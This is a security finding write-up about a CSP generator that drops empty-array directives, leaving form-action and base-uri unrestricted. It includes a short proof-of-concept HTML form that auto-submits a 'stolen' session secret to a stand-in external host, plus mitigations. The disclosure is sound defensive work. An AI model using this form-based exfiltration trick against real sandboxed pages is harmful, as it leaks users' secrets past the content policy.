# Research 12: Directives Dropped by the Empty-Array Rule Do Not All Fall Back

## Summary

`generateCSP()` omits any directive whose value is an empty array. Its docstring states the reason
(`src/lib/csp/csp-generator.ts:3-5`):

> *Generates a CSP string from a JSON object of directives.*
> **Empty arrays are omitted to allow `default-src` fallback.**

**That reasoning is not true for every directive.** CSP's fallback chain covers the *fetch*
directives; several directives have no fallback at all. Omitting those does not delegate them to
`default-src 'none'` — it leaves them **unrestricted**.

The shipped default config sets four directives to `[]`. Two of them do not fall back.

## The shipped default policy

Generated from `DEFAULT_SANDBOX_CONFIG` (`src/host.ts:21-42`), verified by running
`generateCSP()` against it:

```
default-src 'none'; upgrade-insecure-requests; script-src 'self' 'unsafe-inline';
style-src 'unsafe-inline'; worker-src blob: data:;
```

| Directive | Configured | In the emitted policy | Falls back to `default-src`? | Effective state |
| :--- | :--- | :---: | :---: | :--- |
| `frame-src` | `[]` | no | ✅ via `child-src` | blocked ✅ |
| `object-src` | `[]` | no | ✅ | blocked ✅ |
| `base-uri` | `[]` | no | ❌ **no fallback** | **unrestricted** |
| `form-action` | `[]` | no | ❌ **no fallback** | **unrestricted** |

## Consequence 1 — `form-action` is an open exfiltration channel

`form-action` governs where a form may submit. With no `form-action` directive, any target is
permitted. Form submission additionally requires the `allow-forms` sandbox capability — which is
a **sanctioned** value in `ALLOWED_CAPABILITIES` (`src/csp-directives.ts`), so a consumer who
enables it for legitimate reasons silently opens the channel.

**Reproduced** with `capabilities: ['allow-scripts', 'allow-forms']` and the default
`connectionsAllowed`:

```html
<form id="f" action="https://not-allowlisted.example/" method="GET">
  <input name="stolen" value="session-secret">
</form>
<script>document.getElementById('f').submit();</script>
```

**Result**: the request reached the network as
`…/local-image.svg?stolen=session-secret`, with **no CSP violation logged**. The submitted values
ride in the query string, so a `GET` form is a complete exfiltration primitive — no `fetch`, no
`connect-src`, no script beyond `submit()`.

This is the same blind spot as [finding 04](../04_websocket_bypass/README.md) (WebSockets) and
[finding 09](../09_monkey_patch_bypass/README.md): a channel the network policy does not observe.

## Consequence 2 — `base-uri` contradicts finding 10's own mitigation

[Finding 10](../10_base_tag_hijacking/README.md) closes with:

> *"we should add `base-uri 'self'` to the CSP. This explicitly forbids `<base>` tags pointing to
> external origins."*

That mitigation was never implemented, and the empty-array rule ensures `base-uri` is absent from
the policy entirely. Sandboxed content is free to inject its own `<base href>`.

Finding 10's verdict ("Mitigated (Partial)") still holds for `fetch`, because `connect-src` *does*
fall back to `default-src 'none'`, so the resolved URL is still checked. But the defence-in-depth
step it recommends is missing, and it matters more than finding 10 knew: the virtual-files design
routes assets through an injected `<base href>` (`src/host.ts:257`), so an attacker-supplied
`<base>` can redirect relative asset resolution within whatever the remaining policy permits.

## Impact

**Medium-High.** `form-action` is a working exfiltration channel under a sanctioned configuration.
`base-uri` is a missing defence-in-depth layer that the repo's own research already called for.
Neither is visible in the config: the consumer sets `[]`, reads it as "deny", and gets "allow".

## Mitigation

1. `generateCSP()` must distinguish **fallback** directives from **non-fallback** ones. For
   `base-uri`, `form-action` (and `frame-ancestors`, `sandbox` — though those are inert under
   `<meta>` delivery, see [finding 11](../11_meta_csp_delivery/README.md)), an empty array must
   emit `'none'` rather than be omitted.
2. Change the default for `base-uri` to `'self'` per finding 10, and `form-action` to `'none'`.
3. Document the semantics: in this config surface, `[]` means **deny**, and the generator is
   responsible for expressing that correctly per directive.

Tracked as backlog **S9**.

## Note on the generator's design intent

`csp-generator.ts` already carries a deliberate exception of exactly this kind — it force-prepends
`default-src 'none'` with the comment *"I'd rather have more security in the library than it being
'pure'"*. The fix here is the same principle applied to the directives that `default-src` cannot
reach.
